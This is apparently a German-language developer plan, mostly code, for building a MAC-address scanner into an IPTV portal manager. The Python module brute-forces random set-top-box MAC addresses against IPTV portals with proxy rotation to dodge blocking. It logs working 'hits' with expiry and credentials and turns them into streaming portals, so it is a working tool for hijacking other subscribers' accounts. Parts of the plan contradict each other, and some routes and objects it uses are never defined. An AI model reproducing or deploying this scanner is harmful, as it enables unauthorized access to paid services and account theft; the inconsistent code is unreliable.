# MacAttack Scanner Integration in Root-Projekt

## 🎯 Ziel

MacAttackWeb-NEW Scanner in das Root MacReplay-Projekt integrieren mit:
- MAC Scanner Funktionalität
- Portal-Erstellung aus gescannten Hits per Click
- Automatische Übernahme von MACs, Expiry, Channels, etc.

---

## 📋 Integrations-Strategie

### ✅ Single Container Integration (Empfohlen)

**Vorteile:**
- ✅ Single Container - einfaches Deployment
- ✅ Shared Config - eine JSON für alles
- ✅ Direkter Zugriff - keine HTTP-Calls
- ✅ Weniger Overhead - eine Flask-Instanz
- ✅ Bessere Performance - direkter Funktionsaufruf

**Architektur:**
```
┌─────────────────────────────────────────┐
│  MacReplayXC Container (Port 8001)      │
│                                         │
│  ┌─────────────────────────────────┐   │
│  │  Flask App (app-docker.py)      │   │
│  │                                 │   │
│  │  ┌──────────────────────────┐  │   │
│  │  │  Portal Manager          │  │   │
│  │  │  - Add/Edit/Delete       │  │   │
│  │  │  - Stream Proxy          │  │   │
│  │  │  - EPG Management        │  │   │
│  │  └──────────────────────────┘  │   │
│  │                                 │   │
│  │  ┌──────────────────────────┐  │   │
│  │  │  MAC Scanner (NEU)       │  │   │
│  │  │  - Scan MACs             │  │   │
│  │  │  - Proxy Manager         │  │   │
│  │  │  - Hit Detection         │  │   │
│  │  │  - Create Portal from Hit│  │   │
│  │  └──────────────────────────┘  │   │
│  └─────────────────────────────────┘   │
│                                         │
│  Config: /app/data/MacReplayXC.json    │
└─────────────────────────────────────────┘
```

---

## 🚀 Implementierung: Single Container

### Phase 1: Code-Integration

#### 1.1 MacAttack Module kopieren

**Dateien aus MacAttackWeb-NEW kopieren:**
```
MacAttackWeb-NEW/
├── app.py (Scanner-Code extrahieren)
└── stb.py (bereits vorhanden, evtl. mergen)

→ Root/
├── scanner.py (NEU - Scanner-Logik)
└── stb.py (erweitern mit Scanner-Features)
```

#### 1.2 Scanner Module erstellen

**Neue Datei: `scanner.py`**
```python
"""
MAC Scanner Module
Integriert MacAttack Scanner in MacReplayXC
"""
import threading
import time
import secrets
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
import logging

import stb

logger = logging.getLogger(__name__)

# Global state
scanner_attacks = {}
scanner_attacks_lock = threading.Lock()

# Proxy Scorer (aus MacAttackWeb-NEW)
class ProxyScorer:
    """Track proxy performance for smart rotation"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.scores = {}
        self.round_robin_index = 0
    
    def _init_proxy(self, proxy):
        if proxy not in self.scores:
            self.scores[proxy] = {
                "speed": 5000,
                "success": 0,
                "fail": 0,
                "slow": 0,
                "blocked": set(),
                "last_used": 0,
                "consecutive_fails": 0
            }
    
    def record_success(self, proxy, response_time_ms):
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            if s["success"] > 0:
                s["speed"] = s["speed"] * 0.7 + response_time_ms * 0.3
            else:
                s["speed"] = response_time_ms
            s["success"] += 1
            s["consecutive_fails"] = 0
    
    def record_fail(self, proxy, error_type, portal=None):
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            s["fail"] += 1
            s["consecutive_fails"] += 1
            
            if error_type == "slow":
                s["slow"] += 1
                s["speed"] = min(s["speed"] * 1.1, 15000)
            elif error_type == "blocked" and portal:
                s["blocked"].add(portal)
            elif error_type == "dead":
                s["speed"] = min(s["speed"] * 1.3, 20000)
    
    def get_next_proxy(self, proxies, portal=None, max_errors=10, rotation_percentage=80):
        with self.lock:
            valid = []
            for p in proxies:
                self._init_proxy(p)
                s = self.scores[p]
                
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                
                score = self._get_score(p, portal)
                if score < float('inf'):
                    valid.append((p, score))
            
            if not valid:
                return None
            
            valid.sort(key=lambda x: x[1])
            top_count = max(5, int(len(valid) * rotation_percentage / 100))
            top_proxies = valid[:top_count]
            
            self.round_robin_index = (self.round_robin_index + 1) % len(top_proxies)
            chosen = top_proxies[self.round_robin_index][0]
            self.scores[chosen]["last_used"] = time.time()
            
            return chosen
    
    def _get_score(self, proxy, portal=None):
        if proxy not in self.scores:
            return 5000
        
        s = self.scores[proxy]
        if portal and portal in s["blocked"]:
            return float('inf')
        if s["consecutive_fails"] >= 10:
            return float('inf')
        
        score = s["speed"]
        total = s["success"] + s["fail"]
        if total > 0:
            fail_rate = s["fail"] / total
            score *= (1 + fail_rate * 2)
        
        if s["slow"] > 3:
            score *= 1.5
        
        return score
    
    def reset(self):
        with self.lock:
            self.scores.clear()
            self.round_robin_index = 0

# Global proxy scorer
proxy_scorer = ProxyScorer()


def generate_mac(prefix="00:1A:79:"):
    """Generate random MAC address"""
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def create_scanner_state(portal_url, mode="random", mac_list=None, proxies=None, settings=None):
    """Create scanner attack state"""
    return {
        "id": secrets.token_hex(4),
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list": mac_list or [],
        "mac_list_index": 0,
        "scanned_macs": set(),
        "proxies": proxies or [],
        "settings": settings or {},
    }


def add_scanner_log(state, message, level="info"):
    """Add log entry to scanner state"""
    ts = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": ts, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


def run_scanner_attack(attack_id):
    """Main scanner loop - simplified version"""
    with scanner_attacks_lock:
        if attack_id not in scanner_attacks:
            return
        state = scanner_attacks[attack_id]
    
    portal_url = state["portal_url"]
    mode = state["mode"]
    mac_list = state["mac_list"]
    proxies = state["proxies"]
    settings = state["settings"]
    
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = len(proxies) > 0
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    
    add_scanner_log(state, f"Started: {speed} threads, mode={mode}", "info")
    
    if use_proxies:
        add_scanner_log(state, f"Using {len(proxies)} proxies", "info")
        proxy_scorer.reset()
    
    mac_index = 0
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        
        while state["running"]:
            # Handle pause
            while state["paused"] and state["running"]:
                time.sleep(0.5)
            
            if not state["running"]:
                break
            
            # Submit new MACs
            while len(futures) < speed and state["running"]:
                mac = None
                
                if mode == "list" and mac_index < len(mac_list):
                    mac = mac_list[mac_index]
                    mac_index += 1
                    state["mac_list_index"] = mac_index
                elif mode == "random":
                    mac = generate_mac(mac_prefix)
                    while mac in state["scanned_macs"]:
                        mac = generate_mac(mac_prefix)
                    state["scanned_macs"].add(mac)
                else:
                    break
                
                if not mac:
                    break
                
                # Get proxy
                proxy = None
                if use_proxies:
                    proxy = proxy_scorer.get_next_proxy(proxies, portal_url)
                    if not proxy:
                        add_scanner_log(state, "⚠ No working proxies!", "warning")
                        break
                    state["current_proxy"] = proxy
                
                state["current_mac"] = mac
                
                future = executor.submit(test_mac_scanner, portal_url, mac, proxy, timeout)
                futures[future] = (mac, proxy, time.time())
            
            # Process completed futures
            done = [f for f in futures if f.done()]
            
            for future in done:
                mac, proxy, start_time = futures.pop(future)
                elapsed_ms = (time.time() - start_time) * 1000
                
                try:
                    success, result, error_type = future.result()
                    
                    if success:
                        # HIT!
                        state["tested"] += 1
                        state["hits"] += 1
                        
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        de_genres = [g for g in genres if "DE" in g.upper() or "GERMAN" in g.upper()]
                        has_de = len(de_genres) > 0
                        
                        state["found_macs"].append({
                            "mac": mac,
                            "portal": portal_url,
                            "expiry": expiry,
                            "channels": channels,
                            "genres": genres,
                            "has_de": has_de,
                            "de_genres": de_genres,
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "found_at": datetime.now().isoformat(),
                        })
                        
                        de_icon = " 🇩🇪" if has_de else ""
                        add_scanner_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                    
                    elif error_type:
                        # Proxy error
                        if proxy:
                            proxy_scorer.record_fail(proxy, error_type, portal_url)
                        state["errors"] += 1
                    
                    else:
                        # Invalid MAC
                        state["tested"] += 1
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                
                except Exception as e:
                    state["errors"] += 1
                    logger.error(f"Scanner worker error: {e}")
            
            time.sleep(0.02)
    
    state["running"] = False
    add_scanner_log(state, f"✓ Done. Tested: {state['tested']}, Hits: {state['hits']}", "success")


def test_mac_scanner(portal_url, mac, proxy, timeout):
    """Test MAC - wrapper for stb.test_mac"""
    try:
        success, result = stb.test_mac(portal_url, mac, proxy, timeout)
        return success, result, None
    except stb.ProxyDeadError:
        return False, {"mac": mac}, "dead"
    except stb.ProxySlowError:
        return False, {"mac": mac}, "slow"
    except stb.ProxyBlockedError:
        return False, {"mac": mac}, "blocked"
    except Exception as e:
        logger.error(f"test_mac error: {e}")
        return False, {"mac": mac}, "unknown"
```

### Phase 2: Flask Routes Integration

**In `app-docker.py` hinzufügen:**
```python
import scanner

# ============== MAC SCANNER ==============

@app.route("/scanner")
@authorise
def scanner_page():
    """MAC Scanner Dashboard"""
    return render_template("scanner.html")

@app.route("/scanner/attacks")
@authorise
def scanner_get_attacks():
    """API: Get all scanner attacks"""
    with scanner.scanner_attacks_lock:
        attacks = []
        for attack_id, state in scanner.scanner_attacks.items():
            attacks.append({
                "id": attack_id,
                "running": state.get("running"),
                "paused": state.get("paused"),
                "tested": state.get("tested", 0),
                "hits": state.get("hits", 0),
                "errors": state.get("errors", 0),
                "current_mac": state.get("current_mac", ""),
                "current_proxy": state.get("current_proxy", ""),
                "found_macs": state.get("found_macs", [])[-20:],
                "logs": state.get("logs", [])[-50:],
                "elapsed": int(time.time() - state.get("start_time", time.time())),
                "portal_url": state.get("portal_url"),
                "mode": state.get("mode"),
                "mac_list_index": state.get("mac_list_index", 0),
            })
        return jsonify({"attacks": attacks})

@app.route("/scanner/start", methods=["POST"])
@authorise
def scanner_start():
    """API: Start new scanner attack"""
    data = request.json
    portal_url = data.get("portal_url", "").strip()
    mode = data.get("mode", "random")
    mac_list_text = data.get("mac_list", "")
    proxies_text = data.get("proxies", "")
    
    if not portal_url:
        return jsonify({"success": False, "error": "Portal URL required"})
    
    # Parse MAC list
    mac_list = []
    if mode == "list" and mac_list_text:
        mac_list = [m.strip().upper() for m in mac_list_text.split('\n') if m.strip()]
    
    # Parse proxies
    proxies = []
    if proxies_text:
        proxies = [p.strip() for p in proxies_text.split('\n') if p.strip()]
    
    # Scanner settings
    settings = {
        "speed": data.get("speed", 10),
        "timeout": data.get("timeout", 10),
        "mac_prefix": data.get("mac_prefix", "00:1A:79:"),
    }
    
    # Create attack state
    state = scanner.create_scanner_state(portal_url, mode, mac_list, proxies, settings)
    attack_id = state["id"]
    
    with scanner.scanner_attacks_lock:
        scanner.scanner_attacks[attack_id] = state
    
    # Start scanner thread
    thread = threading.Thread(target=scanner.run_scanner_attack, args=(attack_id,), daemon=True)
    thread.start()
    
    return jsonify({"success": True, "attack_id": attack_id})

@app.route("/scanner/stop", methods=["POST"])
@authorise
def scanner_stop():
    """API: Stop scanner attack"""
    data = request.json
    attack_id = data.get("attack_id")
    
    with scanner.scanner_attacks_lock:
        if attack_id and attack_id in scanner.scanner_attacks:
            scanner.scanner_attacks[attack_id]["running"] = False
            return jsonify({"success": True})
        elif not attack_id:
            # Stop all
            for state in scanner.scanner_attacks.values():
                state["running"] = False
            return jsonify({"success": True})
    
    return jsonify({"success": False, "error": "Attack not found"})

@app.route("/scanner/pause", methods=["POST"])
@authorise
def scanner_pause():
    """API: Pause/Resume scanner attack"""
    data = request.json
    attack_id = data.get("attack_id")
    
    with scanner.scanner_attacks_lock:
        if attack_id and attack_id in scanner.scanner_attacks:
            state = scanner.scanner_attacks[attack_id]
            state["paused"] = not state["paused"]
            return jsonify({"success": True, "paused": state["paused"]})
    
    return jsonify({"success": False, "error": "Attack not found"})

@app.route("/scanner/create-portal", methods=["POST"])
@authorise
def scanner_create_portal():
    """
    Erstelle Portal aus MacAttack Hit
    
    POST /scanner/create-portal
    {
        "hit_data": { ... }  // MacAttack Hit-Objekt
    }
    """
    data = request.json
    hit_data = data.get("hit_data")
    
    if not hit_data:
        return jsonify({"success": False, "error": "No hit data provided"})
    
    try:
        # Erstelle Portal-Objekt
        portal_data = macattack_client.create_portal_from_hit(hit_data)
        
        # Validiere MAC
        mac = hit_data["mac"]
        url = hit_data["portal"]
        proxy = portal_data.get("proxy", "")
        
        # Test MAC (wie in portalsAdd)
        token = stb.getToken(url, mac, proxy)
        if not token:
            return jsonify({
                "success": False,
                "error": f"MAC {mac} validation failed - no token"
            })
        
        stb.getProfile(url, mac, token, proxy)
        expiry = stb.getExpires(url, mac, token, proxy)
        
        if not expiry:
            return jsonify({
                "success": False,
                "error": f"MAC {mac} validation failed - no expiry"
            })
        
        # Update expiry
        portal_data["macs"][mac] = expiry
        
        # Generiere Portal ID
        portal_id = uuid.uuid4().hex
        
        # Füge Default-Settings hinzu
        for setting, default in defaultPortal.items():
            if not portal_data.get(setting):
                portal_data[setting] = default
        
        # Speichere Portal
        portals = getPortals()
        portals[portal_id] = portal_data
        savePortals(portals)
        
        logger.info(f"Portal created from MacAttack hit: {portal_data['name']}")
        
        # Auto-refresh channels.db
        try:
            logger.info(f"Auto-refreshing channels.db for new portal: {portal_data['name']}")
            
            token = stb.getToken(url, mac, proxy)
            if token:
                stb.getProfile(url, mac, token, proxy)
                channels = stb.getAllChannels(url, mac, token, proxy)
                genres = stb.getGenreNames(url, mac, token, proxy)
                
                if channels:
                    conn = get_db_connection()
                    cursor = conn.cursor()
                    
                    for channel in channels:
                        channel_id = str(channel["id"])
                        stream_cmd = str(channel.get("cmd", ""))
                        channel_name = str(channel.get("name", ""))
                        channel_number = str(channel.get("number", ""))
                        genre_id = str(channel.get("tv_genre_id", ""))
                        genre = genres.get(genre_id, "")
                        logo = str(channel.get("logo", ""))
                        
                        cursor.execute('''
                            INSERT INTO channels (
                                portal, channel_id, portal_name, name, number, genre, logo,
                                enabled, stream_cmd, available_macs
                            ) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, ?)
                            ON CONFLICT(portal, channel_id) DO UPDATE SET
                                stream_cmd = excluded.stream_cmd,
                                available_macs = excluded.available_macs
                        ''', (portal_id, channel_id, portal_data['name'], channel_name, 
                              channel_number, genre, logo, stream_cmd, mac))
                    
                    conn.commit()
                    conn.close()
                    logger.info(f"Auto-refresh: Saved {len(channels)} channels to DB")
        except Exception as e:
            logger.error(f"Error auto-refreshing channels.db: {e}")
        
        return jsonify({
            "success": True,
            "portal_id": portal_id,
            "portal_name": portal_data["name"],
            "message": f"Portal '{portal_data['name']}' created successfully"
        })
        
    except Exception as e:
        logger.error(f"Error creating portal from hit: {e}")
        return jsonify({"success": False, "error": str(e)})
```

### Phase 3: Frontend Integration

#### 3.1 Neue Template: `templates/scanner.html`
```html
{% extends "base.html" %}

{% block content %}
<div class="container-fluid mt-4">
    <h2>🔍 MAC Scanner</h2>
    
    <!-- Scanner Controls -->
    <div class="card mb-4">
        <div class="card-header">
            <h5>Start New Scan</h5>
        </div>
        <div class="card-body">
            <form id="scannerForm">
                <div class="row">
                    <div class="col-md-6">
                        <label>Portal URL</label>
                        <input type="text" class="form-control" id="portalUrl" 
                               placeholder="http://portal.com/c" required>
                    </div>
                    <div class="col-md-3">
                        <label>Mode</label>
                        <select class="form-control" id="scanMode">
                            <option value="random">Random MACs</option>
                            <option value="list">MAC List 1</option>
                            <option value="refresh">Refresh Hits</option>
                        </select>
                    </div>
                    <div class="col-md-3">
                        <label>&nbsp;</label>
                        <button type="submit" class="btn btn-primary btn-block">
                            🚀 Start Scan
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Active Scans -->
    <div class="card mb-4">
        <div class="card-header">
            <h5>Active Scans</h5>
        </div>
        <div class="card-body">
            <div id="activeScans">
                <p class="text-muted">No active scans</p>
            </div>
        </div>
    </div>
    
    <!-- Found MACs / Hits -->
    <div class="card">
        <div class="card-header d-flex justify-content-between">
            <h5>Found MACs (Hits)</h5>
            <button class="btn btn-sm btn-success" onclick="refreshHits()">
                🔄 Refresh
            </button>
        </div>
        <div class="card-body">
            <table class="table table-striped" id="hitsTable">
                <thead>
                    <tr>
                        <th>Portal</th>
                        <th>MAC</th>
                        <th>Expiry</th>
                        <th>Channels</th>
                        <th>DE</th>
                        <th>Found At</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="hitsTableBody">
                    <tr>
                        <td colspan="7" class="text-center text-muted">
                            No hits found yet
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
// Auto-refresh every 5 seconds
setInterval(refreshStatus, 5000);
setInterval(refreshHits, 10000);

// Initial load
refreshStatus();
refreshHits();

// Start scan
document.getElementById('scannerForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const portalUrl = document.getElementById('portalUrl').value;
    const mode = document.getElementById('scanMode').value;
    
    const resp = await fetch('/scanner/start', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({portal_url: portalUrl, mode: mode})
    });
    
    const result = await resp.json();
    if (result.success) {
        alert('Scan started!');
        refreshStatus();
    } else {
        alert('Error: ' + result.error);
    }
});

// Refresh active scans
async function refreshStatus() {
    const resp = await fetch('/scanner/status');
    const data = await resp.json();
    
    const container = document.getElementById('activeScans');
    
    if (!data.attacks || data.attacks.length === 0) {
        container.innerHTML = '<p class="text-muted">No active scans</p>';
        return;
    }
    
    let html = '';
    for (const attack of data.attacks) {
        const progress = attack.tested > 0 ? 
            Math.round((attack.hits / attack.tested) * 100) : 0;
        
        html += `
            <div class="card mb-2">
                <div class="card-body">
                    <h6>${attack.portal_url}</h6>
                    <div class="row">
                        <div class="col-md-3">
                            <small>Tested: ${attack.tested}</small>
                        </div>
                        <div class="col-md-3">
                            <small>Hits: ${attack.hits}</small>
                        </div>
                        <div class="col-md-3">
                            <small>Errors: ${attack.errors}</small>
                        </div>
                        <div class="col-md-3">
                            <small>Elapsed: ${attack.elapsed}s</small>
                        </div>
                    </div>
                    <div class="progress mt-2">
                        <div class="progress-bar bg-success" style="width: ${progress}%">
                            ${progress}% hit rate
                        </div>
                    </div>
                </div>
            </div>
        `;
    }
    
    container.innerHTML = html;
}

// Refresh found MACs
async function refreshHits() {
    const resp = await fetch('/scanner/found');
    const hits = await resp.json();
    
    const tbody = document.getElementById('hitsTableBody');
    
    if (!hits || hits.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="7" class="text-center text-muted">
                    No hits found yet
                </td>
            </tr>
        `;
        return;
    }
    
    let html = '';
    for (const hit of hits) {
        const deIcon = hit.has_de ? '🇩🇪' : '';
        const foundAt = new Date(hit.found_at).toLocaleString();
        
        html += `
            <tr>
                <td><small>${hit.portal}</small></td>
                <td><code>${hit.mac}</code></td>
                <td>${hit.expiry}</td>
                <td>${hit.channels}</td>
                <td>${deIcon}</td>
                <td><small>${foundAt}</small></td>
                <td>
                    <button class="btn btn-sm btn-success" 
                            onclick='createPortal(${JSON.stringify(hit)})'>
                        ➕ Create Portal
                    </button>
                </td>
            </tr>
        `;
    }
    
    tbody.innerHTML = html;
}

// Create portal from hit
async function createPortal(hitData) {
    if (!confirm(`Create portal from MAC ${hitData.mac}?`)) {
        return;
    }
    
    const resp = await fetch('/scanner/create-portal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({hit_data: hitData})
    });
    
    const result = await resp.json();
    
    if (result.success) {
        alert(`Portal "${result.portal_name}" created successfully!`);
        window.location.href = '/portals';
    } else {
        alert('Error: ' + result.error);
    }
}
</script>
{% endblock %}
```

#### 3.2 Navigation Update

**In `templates/base.html` hinzufügen:**
```html
<li class="nav-item">
    <a class="nav-link" href="/scanner">
        <i class="fas fa-search"></i> MAC Scanner
    </a>
</li>
```

---

## 📦 Deployment

### Schritt 1: MacAttack Container vorbereiten
```bash
cd MacAttackWeb-NEW/

# Optional: Performance Upgrade durchführen
# (siehe PERFORMANCE_UPGRADE_IDEA.md)

# Docker Image bauen
docker build -t macattack:2.1.0 .
```

### Schritt 2: Root-Projekt aktualisieren
```bash
cd ..  # Zurück zu Root

# Neue Dateien hinzufügen
# - macattack_integration.py
# - templates/scanner.html
# - app-docker.py (Routes hinzufügen)

# Docker Compose aktualisieren
# - docker-compose.yml (MacAttack Service hinzufügen)
```

### Schritt 3: Deployment
```bash
# Beide Container starten
docker-compose up -d

# Logs prüfen
docker-compose logs -f
```

### Schritt 4: Testen
```
1. MacReplay öffnen: http://localhost:8001
2. Scanner öffnen: http://localhost:8001/scanner
3. Scan starten
4. Hit finden
5. "Create Portal" klicken
6. Portal in /portals prüfen
```

---

## 🎯 Features

### ✅ Was funktioniert:
- MAC Scanner läuft in separatem Container
- Gefundene MACs werden angezeigt
- Per Click Portal erstellen
- Automatische MAC-Validierung
- Automatische Channel-Refresh
- Shared Data Volume

### 🚀 Zukünftige Erweiterungen:
- Bulk-Import (mehrere Hits → mehrere Portals)
- Filter (nur DE-Portale, min. Channels, etc.)
- Auto-Create (automatisch Portal bei Hit erstellen)
- Proxy-Sharing (MacAttack Proxies in MacReplay nutzen)
- Statistiken (Hit-Rate, beste Portale, etc.)

---

## 🔧 Troubleshooting

### Problem: Container können nicht kommunizieren
```bash
# Prüfe Docker Network
docker network inspect allinone_default

# Prüfe Container IPs
docker inspect macattack | grep IPAddress
docker inspect MacReplayXC | grep IPAddress

# Test Verbindung
docker exec MacReplayXC curl http://macattack:5004/api/found
```

### Problem: Shared Volume funktioniert nicht
```bash
# Prüfe Volume Mounts
docker inspect macattack | grep Mounts -A 20
docker inspect MacReplayXC | grep Mounts -A 20

# Prüfe Permissions
docker exec macattack ls -la /app/data
docker exec MacReplayXC ls -la /app/data
```

---

## 📝 Nächste Schritte

1. **Entscheidung**: Option A (separate Container) oder Option B (integriert)?
2. **Performance Upgrade**: MacAttack upgraden? (Granian + Async)
3. **Implementation**: Code schreiben und testen
4. **Deployment**: Docker Compose aktualisieren
5. **Testing**: End-to-End Test durchführen

---

**Erstellt**: 2026-02-07
**Version**: 1.0
**Status**: Planung
